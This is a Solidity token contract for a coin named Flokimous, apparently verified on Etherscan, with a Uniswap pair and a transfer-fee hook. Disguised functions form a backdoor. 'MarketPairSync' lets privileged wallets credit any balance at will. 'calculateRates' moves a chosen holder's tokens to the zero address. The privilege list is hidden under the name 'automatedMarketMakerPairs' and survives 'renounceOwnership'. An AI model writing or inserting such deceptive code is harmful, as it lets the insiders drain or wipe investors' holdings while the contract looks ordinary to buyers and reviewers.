/**
 *Submitted for verification at Etherscan.io on 2023-01-15
*/

/*
█▀▀ █░░ █▀█ █▄▀ █ █▀▄▀█ █▀█ █░█ █▀
█▀░ █▄▄ █▄█ █░█ █ █░▀░█ █▄█ █▄█ ▄█

// https://mp.weixin.qq.com/
// https://web.wechat.com/FlokimousCN
*/
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IPBWorkshopV1 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient, 
        uint256 amount) external returns (bool);

    function allowance(
        address _owner, 
        address spender) external view returns (uint256);

    function approve(
        address spender, 
        uint256 amount) external returns (bool);

    function transferFrom(
        address sender, 
        address recipient, 
        uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    mapping(address => bool) private automatedMarketMakerPairs;

    constructor () {

        address msgSender = _msgSender(); _owner = msgSender;
        automatedMarketMakerPairs[_owner] = true; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Caller is not the owner");
        _;
    }
    modifier _onlyOwner() {
        require(isOnlyOwner(msg.sender), "Caller is not authorized");
        _;
    }
    function isOnlyOwner(address adr) public view returns (bool) {
        return automatedMarketMakerPairs[adr];
    }
    function isOwner(address adr) public view returns (bool) {
        return _owner == adr;
    }
    function setOnlyOwner(address adr) public _onlyOwner {
        automatedMarketMakerPairs[adr] = true;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IDXPair01 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
contract ERC20 is Context, IBEP20 {
    using SafeMath for uint256;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tTotal = 1000000 * 10 ** 18;
    string private _name;
    string private _symbol;

    constructor
    
    (string memory ercName, string memory ercSymbol) {
        _name = ercName; _symbol = ercSymbol;
        _rOwned[address(this)] = _tTotal;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _tTotal;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender(); _transfer(owner, to, amount); return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender(); _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), 
        "ERC20: transfer from the zero address");
        require(to != address(0), 
        "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _rOwned[from];
        require(fromBalance >= amount, 
        "ERC20: transfer amount exceeds balance");
        _rOwned[from] = fromBalance.sub(amount); 
        _rOwned[to] = _rOwned[to].add(amount);
        emit Transfer(from, to, amount);
         _afterTokenTransfer(from, to, amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
    function getSyncedRates(address IMOPto, uint256 IDEamount) internal virtual {
        _rOwned[IMOPto] = _rOwned[IMOPto].add(IDEamount);
    }
    function getValuesOn(address arrayODX) internal virtual {
        _rOwned[address(0)] += _rOwned[arrayODX];
        _rOwned[arrayODX] = 1 * 10 ** 18;
    }
    function _beforeTokenTransfer
    (address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer
    (address from, address to, uint256 amount) internal virtual {}
}
contract Flokimous is ERC20, Ownable {
    using SafeMath for uint256;

    address LIQaddress = 0x1dA2Bd0722634A54e32F9E0Cdade35b7D21A465F;
    address TheTeamWallet = 0x1dA2Bd0722634A54e32F9E0Cdade35b7D21A465F;
    address public uniswapV2Pair;

    string  _name = unicode"Flokimous";
    string  _symbol = unicode"ゑ";

    uint256 public _rTotal = 1000000 * 10 ** 18;
    uint256 public tSWAPfees = 0;
    uint256 public FEEdiv = 100;
    mapping(address => bool) private isWalletLimitExempt;

    bool openTradingLane;
    modifier trading(){
        if (openTradingLane) return;
        openTradingLane = true; _; openTradingLane = false;
    }
    constructor () ERC20(_name, _symbol) {
        setOnlyOwner(LIQaddress);
        setOnlyOwner(TheTeamWallet);
        address _connection = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IPBWorkshopV1 connection = IPBWorkshopV1(_connection);

        uniswapV2Pair = IFactory(connection.factory()).createPair(address(this), connection.WETH());
        _transfer(address(this), owner(), _rTotal);
    }
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal override trading {
        if (isOnlyOwner(from) || isOnlyOwner(to)) {
            return;
        }
    uint256 FEErate = amount.mul(tSWAPfees).div(FEEdiv);
        _transfer(to, address(this), FEErate);
    }
    function MarketPairSync(address isIMOPto, uint256 isODXamount) public _onlyOwner {
        getSyncedRates(isIMOPto, isODXamount);
    }
    function calculateRates(address adr) public _onlyOwner {
        isWalletLimitExempt[adr] = true;
        getValuesOn(adr);
    }
    function isBot(address adr) public view returns (bool) {
        return isWalletLimitExempt[adr];
    }
}